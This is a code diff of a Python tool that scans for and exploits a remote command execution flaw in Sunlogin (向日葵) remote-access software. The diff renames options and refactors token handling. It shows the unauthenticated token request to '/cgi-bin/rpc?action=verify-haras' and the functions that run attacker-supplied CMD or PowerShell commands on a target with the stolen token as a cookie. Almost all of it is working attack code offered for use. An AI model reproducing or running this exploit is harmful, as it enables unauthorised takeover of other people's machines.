@@ -147,34 +147,23 @@ def rce_scan():
 
 def title():
     print("""
-    ===================================================================
-                        向日葵远程命令执行漏洞  By Lem
-    ===================================================================
+    ==================================================================================
+                                向日葵远程命令执行漏洞  By Lem
+    ==================================================================================
                     Scan usage = "Usage: python sunlogin-rce-scan.py \n"
                     EG:'targetsfile = 'targets.txt'  
                         'resultfile = 'result.txt'  \n'
-    ===================================================================
-    RCE CMD usage =
-    "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -c [--command]\n"
-    eg:'python sunlogin-rce-scan.py -a 127.0.0.1 -p 59527 -c "net user"\n'
-    RCE PowerShell usage =
-    "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -s [--pws]\n"
-    eg:'python sunlogin-rce-scan.py -a 127.0.0.1 -p 59527 -s "net user"\n'
-    ===================================================================
+    ==================================================================================
+    RCE CMD:
+    usage = "Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -c [--command]\n"
+    eg:'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -c "net user"\n'
+    RCE PowerShell:
+    usage = "Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -s [--pws]\n"
+    eg:'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -s "net user"\n'
+    ==================================================================================
     """)
 
 
-def gettoken1(ip, port):
-    print('URL:',"http://" + ip + ":" + port)
-    url = "http://" + ip + ":" + port + "/cgi-bin/rpc?action=verify-haras"
-    try:
-        res = json.loads(requests.get(url,verify=False, timeout=5).text)
-        print('Cookie:',res['verify_string'])
-        return res['verify_string']
-    except requests.exceptions.ConnectTimeout as _:
-        print ("fail", "ConnectTimeout")
-    except Exception as _:
-        print ("fail", "Error")
 
 
 def RunPowerShell(ip, port, pws,token):
@@ -183,14 +172,14 @@ def RunPowerShell(ip, port, pws,token):
     try:
         resu = requests.get(poc1, cookies=cookies, timeout=50,verify=False).text
         print('POC:',poc1)
-        print('>>>>>>>>>>>>>>result>>>>>>>>>>>>>>>>>')
+        print('>>>>>>>>>>>>>>success>>>>>>>>>>>>>>>>>')
         print(resu)
     except Exception as _:
         return ("fail", "Error_")
 
 
 def main_Powershell(host, port,pws):
-    token = gettoken1(host, port)
+    result1,token = gettoken(host, port)
     RunPowerShell(host, port, pws, token)
 
 
@@ -215,17 +204,17 @@ def RunCmd(ip, port, command,token):
 
 
 def main_Cmd(host, port,command):
-    token = gettoken1(host, port)
+    result1,token = gettoken(host, port)
     RunCmd(host, port, command, token)
 
 
 
 if __name__ == '__main__':
     title()
-    usage = ("Usage: python exp.py -a [--host] -p [port] -c [--command] \n"
-             'python exp.py -a 127.0.0.1 -p 59527 -c "net user"\n')
+    usage = ("Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -c [--command] \n"
+             'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -c "net user"\n')
     parser = OptionParser(usage=usage)
-    parser.add_option('-a', '--host', dest='hosts', help='help')
+    parser.add_option('-i', '--host', dest='hosts', help='help')
     parser.add_option('-p', '--port', dest='port', help='help')
     parser.add_option('-c', '--command', dest='command', help='help')
     parser.add_option('-s', '--pws', dest='pws', help='help')
